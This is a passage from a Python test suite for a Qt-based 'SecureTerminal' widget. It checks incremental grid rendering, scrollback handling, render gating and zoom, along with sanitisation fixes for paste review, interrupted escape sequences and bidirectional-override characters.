def _feed_render_chunks(term, data, chunks):
    """Feed `data` in `chunks` reads, rendering after each -- the shot-mode /
    progressive-draw path the incremental renderer has to keep linear."""
    n = len(data)
    step = max(1, n // chunks)
    i = 0
    while i < n:
        term._feed_stream(data[i:i + step])
        term._render_tui()
        i += step


def _show_grid(mode_markings_theme=(None, None)):
    _t = SecureTerminal(command='/bin/cat', tui=True)
    _t.apply_mode('show')
    _t.resize(1200, 700)
    _t.show()
    pump(60)
    _mk, _th = mode_markings_theme
    if _mk is not None:
        _t.apply_markings(_mk)
    if _th is not None and _th != _t._theme:
        _t.apply_theme(_th)
    return _t


# 1. A fits-on-screen board drawn progressively over many reads renders to the
# SAME document (content + formats) as one full-rebuild render of the same bytes.
_ib = _show_grid()
_ibc = min(60, _ib._screen.columns)
_ibr = min(18, _ib._screen.lines - 2)
_ib_board = _distinct_board(_ibc, _ibr)
_feed_render_chunks(_ib, _ib_board, 12)
_ib_ref = _show_grid()
_ib_ref._feed_stream(_ib_board)
_ib_ref._render_tui()
eq(_doc_cells(_ib), _doc_cells(_ib_ref),
   'incremental progressive render == a single full rebuild (content + every format)')
_ib.shutdown()
_ib_ref.shutdown()

# 2. Linearity: each of the board's rows is inserted about once (plus a small
# re-render of the active tail), NOT re-inserted on every read. A full rebuild
# per read would insert many multiples of the row count. FAILS on the old code.
_orig_igr = SecureTerminal._insert_grid_row
_igr_calls = [0]


def _counting_igr(self, cursor, row, columns):
    _igr_calls[0] += 1
    return _orig_igr(self, cursor, row, columns)


SecureTerminal._insert_grid_row = _counting_igr
try:
    _pf = _show_grid()
    _pfr = min(18, _pf._screen.lines - 2)
    _feed_render_chunks(_pf, _distinct_board(min(60, _pf._screen.columns), _pfr), 12)
    _rowins = _igr_calls[0]
    _pf.shutdown()
finally:
    SecureTerminal._insert_grid_row = _orig_igr
ok(_rowins < 3 * _pfr,
   'incremental grid inserts each row ~once (%d inserts for %d rows over 12 reads), '
   'not once per read' % (_rowins, _pfr))

# 3. Scroll flood (3 screens): the incremental render, promoting scrolled-off
# rows to permanent scrollback, is byte-identical to a full rebuild, and keeps
# the live grid bounded to ~one screen even as the document grows.
_fl = _show_grid()
_flr = _fl._screen.lines
_fl_flood = _distinct_board(min(50, _fl._screen.columns), _flr * 3)
_feed_render_chunks(_fl, _fl_flood, 20)
_fl_ref = _show_grid()
_fl_ref._feed_stream(_fl_flood)
_fl_ref._render_tui()
eq(_doc_cells(_fl), _doc_cells(_fl_ref),
   'incremental scroll flood == full rebuild (promoted scrollback rows byte-identical)')
ok(_fl._grid_rows <= _flr + 1,
   'scroll flood keeps the live grid bounded (rows promoted to permanent scrollback)')
ok(_fl.document().blockCount() > _flr + 1,
   'scroll flood grew the document past one screen (scrollback retained)')
_fl.shutdown()
_fl_ref.shutdown()

# 4. Fallback: rows that scroll into history without having been rendered as
# leading grid blocks (many lines fed with NO render between) take the correct
# full-rebuild path.
_fb = SecureTerminal(command='/bin/cat', tui=True)
_fb.apply_mode('show')
_fb.resize(700, 300)
_fb.show()
pump(40)
for _k in range(_fb._screen.lines * 2):
    _fb._feed_stream(('fb-row-%02d\r\n' % _k).encode())        # NO render between feeds
_fb._render_tui()                                              # one render -> fallback
ok('fb-row-%02d' % (_fb._screen.lines * 2 - 1) in _fb.toPlainText(),
   'fallback full rebuild renders the latest row')
ok('fb-row-00' in _fb.toPlainText(),
   'fallback full rebuild renders the scrolled-off history')
_fb.shutdown()

# 5. A row mutated AND scrolled off within a single un-rendered read is NOT
# promoted from its now-stale block: the signature recheck fails, so the frame
# takes the full-rebuild fallback and shows the NEW content.
_mu = SecureTerminal(command='/bin/cat', tui=True)
_mu.apply_mode('show')
_mu.resize(700, 300)
_mu.show()
pump(40)
_mu._feed_stream(b'\x1b[1;1HORIG-TOP\r\nsecond\r\n')
_mu._render_tui()                                    # ORIG-TOP rendered as grid row 0
_mu._feed_stream(b'\x1b[1;1HNEWTOP-X' + b'\r\n' * (_mu._screen.lines + 2))
_mu._render_tui()
ok('NEWTOP-X' in _mu.toPlainText(),
   'a row mutated then scrolled within one read renders its NEW content (fallback)')
ok('ORIG-TOP' not in _mu.toPlainText(),
   'the stale pre-mutation row content is not kept')
_mu.shutdown()

# 6. Drift-proof: an incremental re-render after a markings + theme change equals
# a fresh full build already in that final state -- no cell keeps a stale format,
# because the per-row signature is the rendered runs themselves.
_drb = _distinct_board(30, 8)
_A = _show_grid((False, 'dark'))
_A._feed_stream(_drb)
_A._render_tui()
_A.apply_markings(True)                              # cache clear -> incremental re-render
_A.apply_theme('light')                              # cache clear -> incremental re-render
_B = _show_grid((True, 'light'))                     # the final state, up front
_B._feed_stream(_drb)
_B._render_tui()                                      # a single full build
eq(_doc_cells(_A), _doc_cells(_B),
   'incremental re-render after markings+theme change == a fresh full build (no stale formats)')
_A.shutdown()
_B.shutdown()

# 7. A no-change re-render is a near-noop: nothing is deleted or appended (the
# empty-append and no-delete branches), and the content is preserved.
_nc = SecureTerminal(command='/bin/cat', tui=True)
_nc.apply_mode('show')
_nc.resize(700, 300)
_nc.show()
pump(40)
_nc._feed_stream(b'\x1b[1;1Hstable-row')
_nc._render_tui()
_nc_bc = _nc.document().blockCount()
_nc._render_tui()                                    # identical state -> no delete, no append
eq(_nc.document().blockCount(), _nc_bc,
   'a no-change re-render neither deletes nor appends grid blocks')
ok('stable-row' in _nc.toPlainText(), 'a no-change re-render preserves content')
_nc.shutdown()

# 8. The grid shrinks when output clears to fewer rows: the divergent-tail delete
# removes the now-absent trailing blocks (target shorter than the live grid).
_sk = SecureTerminal(command='/bin/cat', tui=True)
_sk.apply_mode('show')
_sk.resize(700, 300)
_sk.show()
pump(40)
_sk._feed_stream(b'\x1b[1;1Hr1\r\nr2\r\nr3\r\nr4\r\nr5')
_sk._render_tui()
_sk_tall = _sk.document().blockCount()
_sk._feed_stream(b'\x1b[2J\x1b[1;1Hjust-one')        # clear -> a single short row
_sk._render_tui()
ok(_sk.document().blockCount() < _sk_tall,
   'incremental render shrinks the grid when output clears to fewer rows')
ok(_sk.toPlainText().strip().endswith('just-one'),
   'the shrunk grid ends at the new short content')
_sk.shutdown()

# 9. Alt screen reconciles incrementally too: a full-screen program repainting
# one row updates that row and keeps the rest, with a correct frame. Driven via
# the real read path (feed_output) so the alternate-screen state is tracked.
_alt = SecureTerminal(command='/bin/cat', tui=True)
_alt.apply_mode('show')
_alt.resize(700, 300)
_alt.show()
pump(40)
feed_output(_alt, b'\x1b[?1049h')                    # enter the alternate screen
feed_output(_alt, b'\x1b[2J\x1b[1;1HALT-A\x1b[2;1HALT-B\x1b[3;1HALT-C')
_alt._render_tui()
ok(_alt._alt_screen and 'ALT-A' in _alt.toPlainText() and 'ALT-C' in _alt.toPlainText(),
   'alt-screen incremental: the initial frame is rendered')
feed_output(_alt, b'\x1b[2;1HALT-XYZ')               # repaint only row 2
_alt._render_tui()
_alt_txt = _alt.toPlainText()
ok('ALT-XYZ' in _alt_txt and 'ALT-A' in _alt_txt and 'ALT-C' in _alt_txt,
   'alt-screen incremental: a one-row repaint updates that row and keeps the others')
ok('ALT-B' not in _alt_txt, 'alt-screen incremental: the old row content is gone')
_alt.shutdown()

# 10. A scrollback cap smaller than one screen prunes the oldest grid blocks: the
# incremental model keeps only the surviving trailing rows in step, so the next
# delete never computes a negative start (no crash, model stays consistent).
_cap = SecureTerminal(command='/bin/cat', tui=True)
_cap.apply_mode('show')
_cap.apply_scrollback(4)
_cap.resize(700, 400)
_cap.show()
pump(40)
for _k in range(_cap._screen.lines):
    _cap._feed_stream(('cap-%02d\r\n' % _k).encode())
    _cap._render_tui()
ok(_cap.document().blockCount() >= 1 and _cap._grid_rows <= _cap.document().blockCount(),
   'a tiny scrollback cap keeps the incremental grid render consistent (no crash)')
eq(len(_cap._grid_row_sig), _cap._grid_rows,
   'the incremental model tracks exactly the surviving grid blocks under a tiny cap')
_cap.shutdown()

# 11. The trailing-blank trim tests the RENDERED glyph, not cell.data.strip(): a
# lone U+00A0 (str.strip() drops it as whitespace) renders as a visible MARKED
# placeholder, so its row below the cursor must be kept, never trimmed away and
# hidden. FAILS on the old str.strip() trim.
_tr = SecureTerminal(command='/bin/cat', tui=True)
_tr.apply_mode('show')
_tr.resize(700, 400)
_tr.show()
pump(40)
# draw a marked non-breaking space at screen row 6, then move the cursor UP to row 2
_tr._feed_stream('\x1b[1;1Htop\x1b[6;1H\u00a0\x1b[2;1H'.encode())
_tr._render_tui()
ok(_tr._grid_rows >= 6,
   'a marked space (U+00A0) below the cursor keeps its row (rendered-glyph trim, not strip())')
_tr.shutdown()

# 12. Scrollback tracking holds already-rendered history rows BY REFERENCE, not by
# id(): Python can recycle an evicted row's id for a new object, so an id-only set
# could mistake a genuinely new scrolled row for one already rendered and DROP it.
# _new_history_rows compares by identity against the held _top_rows. (ai-review)
_ir = SecureTerminal(command='/bin/cat', tui=True)
_ir.apply_mode('show')
_ir.resize(700, 300)
_ir.show()
pump(40)
_r1, _r2, _r3 = {'r': 1}, {'r': 2}, {'r': 3}
_ir._top_rows = [_r1, _r2]                          # already rendered as scrollback
eq(_ir._new_history_rows([_r1, _r2, _r3]), [_r3],
   'only the genuinely new (by identity) history row counts as new')
_r2b = {'r': 2}                                     # value-equal to _r2, different object
_new = _ir._new_history_rows([_r1, _r2b])
ok(len(_new) == 1 and _new[0] is _r2b,
   'a different object is new even when value-equal (identity, not value, comparison)')
# after a real render _top_rows holds the history rows by reference (so their ids
# cannot be recycled), not a set of ints
for _k in range(_ir._screen.lines + 3):
    _ir._feed_stream(('href-%02d\r\n' % _k).encode())
_ir._render_tui()
_htop = list(_ir._screen.history.top)
ok(_htop and all(any(_h is _t for _t in _ir._top_rows) for _h in _htop[-3:]),
   'after a render _top_rows holds the current history rows by reference')
_ir.shutdown()

# 13. Lowering the scrollback cap below the live-grid size prunes leading blocks
# immediately (setMaximumBlockCount), which would desync the incremental grid
# model (grid_rows / ids / sigs) from the document and let the next _delete_grid
# operate on a stale count. apply_scrollback resyncs the grid view, so the model
# stays aligned and output keeps rendering. (ai-review)
_sb = SecureTerminal(command='/bin/cat', tui=True)
_sb.apply_mode('show')
_sb.resize(700, 400)
_sb.show()
pump(40)
for _k in range(_sb._screen.lines):                 # fill a full grid of content
    _sb._feed_stream(('sbrow-%02d\r\n' % _k).encode())
_sb._render_tui()
ok(_sb._grid_rows > 3, 'a full grid rendered before lowering the scrollback cap')
_sb.apply_scrollback(3)                             # lower the cap BELOW the grid size
ok(_sb.document().blockCount() >= 1,
   'lowering the scrollback cap below the grid does not wipe the document')
eq(len(_sb._grid_row_sig), _sb._grid_rows,
   'the incremental model sigs stay aligned after a cap reduction')
eq(len(_sb._grid_row_ids), _sb._grid_rows,
   'the incremental model ids stay aligned after a cap reduction')
ok(_sb._grid_rows <= _sb.document().blockCount(),
   'grid_rows stays within the pruned document after a cap reduction')
_sb._feed_stream(b'past-cap-row\r\n')               # more output after the cap change
_sb._render_tui()                                   # must not crash on a stale model
ok('past-cap-row' in _sb.toPlainText(),
   'output after a cap reduction still renders (grid model resynced)')
_sb.shutdown()

# 14. Box mode is bounded in row-inserts too, not only show mode (#2): the
# incremental reconcile is mode-independent, so a distinct board fed progressively
# inserts each row about once, not once per read.
_bx = SecureTerminal(command='/bin/cat', tui=True)
_bx.apply_mode('box')
_bx.resize(1200, 700)
_bx.show()
pump(60)
_bxr = min(18, _bx._screen.lines - 2)
_bx_board = _distinct_board(min(60, _bx._screen.columns), _bxr)
_igr_calls[0] = 0
SecureTerminal._insert_grid_row = _counting_igr
try:
    _feed_render_chunks(_bx, _bx_board, 12)
finally:
    SecureTerminal._insert_grid_row = _orig_igr
ok(_igr_calls[0] < 3 * _bxr,
   'box-mode incremental grid inserts each row ~once (%d inserts for %d rows over 12 reads), '
   'not once per read' % (_igr_calls[0], _bxr))
_bx.shutdown()

# 15. Scroll-flood linearity by INSERT COUNT (#3 checks byte-identity + a bounded
# live grid): feeding 3 screens of distinct rows over many reads inserts about one
# block per output row, promoting scrolled-off rows rather than re-drawing them. A
# full rebuild per read would be ~ visible_lines * reads; the incremental render
# stays ~ total rows.
_sf = _show_grid()
_sf_rows = _sf._screen.lines * 3
_sf_board = _distinct_board(min(50, _sf._screen.columns), _sf_rows)
_igr_calls[0] = 0
SecureTerminal._insert_grid_row = _counting_igr
try:
    _feed_render_chunks(_sf, _sf_board, 20)
finally:
    SecureTerminal._insert_grid_row = _orig_igr
ok(_igr_calls[0] < 2 * _sf_rows,
   'scroll-flood inserts ~1 block per output row (%d inserts for %d rows over 20 reads), '
   'not one screen per read' % (_igr_calls[0], _sf_rows))
_sf.shutdown()

# 16. A no-change re-render inserts ZERO grid rows and deletes no block: the
# positional signature diff keeps every block, so the reconcile appends nothing
# (#7 checks the block count; this asserts the insert path explicitly).
_nn = _show_grid()
_nn._feed_stream(_distinct_board(min(40, _nn._screen.columns), 6))
_nn._render_tui()
_nn_bc = _nn.document().blockCount()
_igr_calls[0] = 0
SecureTerminal._insert_grid_row = _counting_igr
try:
    _nn._render_tui()                                # identical state -> no append
finally:
    SecureTerminal._insert_grid_row = _orig_igr
eq(_igr_calls[0], 0,
   'a no-change re-render inserts zero grid rows (positional sig diff keeps all blocks)')
eq(_nn.document().blockCount(), _nn_bc, 'a no-change re-render deletes no block')
_nn.shutdown()

# 17. The _GridRow code-point model is DURABLE across scrollback promotion: a
# marked cell that scrolls off the live grid into permanent scrollback keeps its
# source code point, so _run_cp_at (hover) and the lossless transcript still name
# it -- a pyte-buffer lookup could not, the row is no longer in screen.buffer. This
# is why the grid stores the cp on the block, not only in the live buffer.
_pb = SecureTerminal(command='/bin/cat', tui=True)
_pb.apply_mode('box')
_pb.resize(700, 300)
_pb.show()
pump(40)
_pb._feed_stream((chr(0x202E) + '\r\n').encode())               # a lone RLO -> a box, row 0
_pb._render_tui()
for _pk in range(_pb._screen.lines + 5):                        # scroll row 0 into scrollback
    _pb._feed_stream(('fill-%02d\r\n' % _pk).encode())
    _pb._render_tui()
pump(5)
_grid_top = _pb.document().blockCount() - _pb._grid_rows        # first live-grid block
_pbox = None
_pblk = _pb.document().begin()
while _pblk.isValid():
    if _BX in _pblk.text() and _pblk.blockNumber() < _grid_top:   # a box BELOW the live grid
        _pbox = _pblk.position() + _pblk.text().index(_BX)
        break
    _pblk = _pblk.next()
ok(_pbox is not None, 'the marked box scrolled into permanent scrollback (below the live grid)')
eq(_pb._run_cp_at(_pbox), 0x202E,
   '_run_cp_at names a promoted-scrollback box (durable _GridRow across scroll)')
ok('<U+202E' in _pb.transcript_text(),
   'transcript names a promoted-scrollback neutralized codepoint (durable across scroll)')
_pb.shutdown()

# each reconcile widget owns a /bin/cat pty child; hang them up so the master fds and
# child processes do not linger into the suite's os._exit teardown.
for _rw in (_bp_no, _bp_yes, _hs, _dp, _th, _rb, _sm):
    _rw.shutdown()


# --- render-loop performance + review fixes (perf cycle) ----------------------
from secure_terminal.sanitize import has_bell as _p37_has_bell

# per-tab render gating: interval branches + deferred catch-up (grid mode)
_p37g = SecureTerminal(command='/bin/cat', tui=True)
_p37g.resize(400, 300); _p37g.show(); APP.processEvents()
ok(_p37g._render_active is True and _p37g._render_interval() == 16, 'gating: active interval 16ms')
_p37g.set_render_active(False)
ok(_p37g._render_active is False and _p37g._render_interval() == _p37g._HIDDEN_RENDER_MS,
   'gating: hidden interval is the slow cadence')
_p37g._feed_bytes(b'\x1b[HCATCHUP')
ok(_p37g._screen.buffer[0][0].data == 'C', 'gating: a hidden tab still feeds its pyte model')
ok('CATCHUP' not in _p37g.document().toPlainText(), 'gating: the hidden grid render is deferred')
_p37g.set_render_active(True); APP.processEvents()
ok('CATCHUP' in _p37g.toPlainText(), 'gating: becoming active renders the frame fed while hidden')
_p37g.set_render_active(True)
ok(_p37g._render_active is True, 'gating: set_render_active is idempotent')
_p37g.shutdown()

# CLI catch-up via _flush_paint (assert on _paint_dirty, not toPlainText which flushes)
_p37c = SecureTerminal(command='/bin/cat', tui=False)
_p37c.resize(400, 300); _p37c.show(); APP.processEvents()
_p37c.set_render_active(False)
_p37c._feed_line('hello-cli\n', defer=True)
ok(_p37c._paint_dirty is True, 'gating: a hidden CLI tab defers the paint')
_p37c.set_render_active(True); APP.processEvents()
ok(_p37c._paint_dirty is False, 'gating: becoming active flushes the deferred CLI paint')
ok('hello-cli' in _p37c.toPlainText(), 'gating: the deferred CLI line shows on catch-up')
_p37c.shutdown()

# A: getter-staleness -- transcript/toPlainText force a pending grid render
_p37a = SecureTerminal(command='/bin/cat', tui=True)
_p37a.resize(400, 300); _p37a.show(); APP.processEvents()
_p37a.set_render_active(False)
_p37a._feed_bytes(b'\x1b[HFRESHFRAME'); _p37a._render_timer.start(500)
ok('FRESHFRAME' in _p37a.transcript_text(), 'A: transcript_text forces the pending grid render')
ok(not _p37a._render_timer.isActive(), 'A: the pending render was consumed')
_p37a._feed_bytes(b'\x1b[2;1HSECOND'); _p37a._render_timer.start(500)
ok('SECOND' in _p37a.toPlainText(), 'A: toPlainText forces the pending grid render too')
_p37a.shutdown()

# B: teardown guard -- set_render_active(True) on a torn-down widget must not render
_p37b = SecureTerminal(command='/bin/cat', tui=True)
_p37b.resize(400, 300); _p37b.show(); APP.processEvents()
_p37b.set_render_active(False)
_p37b.shutdown()
_p37b_rendered = []
_p37b._render_tui = lambda: _p37b_rendered.append(1)
_p37b.set_render_active(True)
ok(_p37b_rendered == [], 'B: set_render_active(True) after shutdown skips the catch-up render')
ok(_p37b._render_active is True, 'B: the flag still flips (only the render is guarded)')

# C: hidden-CLI _paint_pending is capped to scrollback (no unbounded growth)
_p37p = SecureTerminal(command='/bin/cat', tui=False)
_p37p.resize(400, 300); _p37p.show(); APP.processEvents()
_p37p._scrollback = 100
_p37p.set_render_active(False)
for _p37i in range(500):
    _p37p._feed_line('line %d\n' % _p37i, defer=True)
ok(len(_p37p._paint_pending) <= 100, 'C: hidden CLI _paint_pending capped to scrollback')
ok(len(_p37p._paint_pending_wraps) == len(_p37p._paint_pending), 'C: wraps stay parallel to pending')
_p37p.shutdown()

# D: single zoom notch applies the font once (trailing same-size apply no-ops)
_p37z = SecureTerminal(command='/bin/cat', tui=True)
_p37z.resize(400, 300); _p37z.show(); APP.processEvents()
_p37z._zoom_debounce_ms = 40
_p37z.apply_zoom(150); APP.processEvents()
_p37z_big = _p37z.font().pointSize()
ok(_p37z.current_zoom() == 150 and _p37z_big > 0, 'D: a zoom notch applies immediately (leading edge)')
_p37z._render_timer.stop()
_p37z._apply_font()
ok(not _p37z._render_timer.isActive(), 'D: a same-size _apply_font no-ops (no second relayout)')
_p37z_applied = _p37z._applied_font_size
_p37z.set_font_size(20)
ok(_p37z._applied_font_size != _p37z_applied, 'D: a genuine font-size change is not skipped')
# burst coalescing: a follow-up while the timer is armed is not applied yet
_p37z._zoom_debounce_ms = 40
_p37z.apply_zoom(120); APP.processEvents()
_p37z_f = _p37z.font().pointSize()
_p37z.apply_zoom(90)
ok(_p37z.current_zoom() == 90 and _p37z.font().pointSize() == _p37z_f,
   'D: a burst follow-up is coalesced (font not re-applied yet)')
ok(_p37z._zoom_timer.isActive(), 'D: the zoom debounce timer is armed for the final size')
_p37z.shutdown()

# has_bell fast-reject: identical to the regex path
ok(_p37_has_bell('\x07') is True, 'bell: a standalone BEL is detected')
ok(_p37_has_bell('hello world') is False, 'bell: no BEL byte -> False (fast path)')
ok(_p37_has_bell('\x1b]0;title\x07') is False, 'bell: an OSC-terminating BEL is not a standalone bell')
ok(_p37_has_bell('ring\x07now') is True, 'bell: a real BEL among text is detected')
ok(_p37_has_bell('') is False, 'bell: empty string -> False')



# --- security cycle: SEC-9 (reviewed paste dispatch) + SEC-4 (interrupted CSI leak) ---
_p9 = SecureTerminal(command='/bin/cat', tui=False)
_p9.resize(400, 300); _p9.show(); APP.processEvents()
_p9.has_foreground_program = lambda: False
_p9._bracketed_paste_active = lambda: False
_p9_disp = []
_p9._dispatch_paste = lambda r, a: _p9_disp.append((r, a))
_p9._review_active = True
_p9._pending_paste = 'a\nb'
_p9.dispatch_pending_paste('stripped')
ok(_p9_disp == [('a\nb', 'stripped')],
   'SEC-9: a resolved paste review dispatches through the sanitizing paste path')
# reject / no-op paths
_p9._review_active = True
_p9._pending_paste = 'x'
_p9.dispatch_pending_paste('reject')
ok(_p9_disp == [('a\nb', 'stripped')], 'SEC-9: a rejected paste dispatches nothing')
_p9.shutdown()

# SEC-4: an interrupted CSI (params, no final byte) must not leak its param bytes as text
_p4 = SecureTerminal(command='/bin/cat', tui=False)
_p4.resize(400, 300); _p4.show(); APP.processEvents()
_p4._feed_line('\x1b[38;5;123\nAFTER')
_p4t = _p4.toPlainText()
ok('38;5;123' not in _p4t, 'SEC-4: an interrupted CSI does not leak its param bytes as literal text')
ok('AFTER' in _p4t, 'SEC-4: the text after an interrupted CSI still renders')
_p4.shutdown()


# --- result -------------------------------------------------------------------
sys.stdout.write('secure-terminal-tests(widget): %d passed, %d failed\n'
                 % (PASS, FAIL))
# The offscreen Qt platform can crash in its static teardown after a clean run
# (destroying the many widgets/pyte screens/timers this suite builds), which
# would turn a fully-passing run into a non-zero exit. All tests have run and the
# result is known, so persist coverage and exit hard, bypassing that teardown.
try:
    import coverage as _coverage
    _covw = _coverage.Coverage.current()
    if _covw is not None:
        _covw.save()
except Exception:
    pass                    # coverage is optional instrumentation, never fatal
sys.stdout.flush()
sys.stderr.flush()
os._exit(0 if FAIL == 0 else 1)
